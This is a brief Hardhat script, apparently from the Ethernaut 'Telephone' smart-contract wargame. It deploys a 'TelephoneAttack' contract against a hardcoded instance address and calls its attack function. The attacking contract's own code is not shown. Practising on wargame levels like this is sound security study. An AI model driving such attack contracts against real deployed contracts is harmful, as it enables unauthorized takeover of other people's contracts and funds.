const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x23214523Af9EBbff7B4B901f2136cC8f385865ba";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("TelephoneAttack");
  const contract = await Contract.deploy(instanceAddress);
  await contract.deployed();

  // Attack

  const tx = await contract.attack();
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
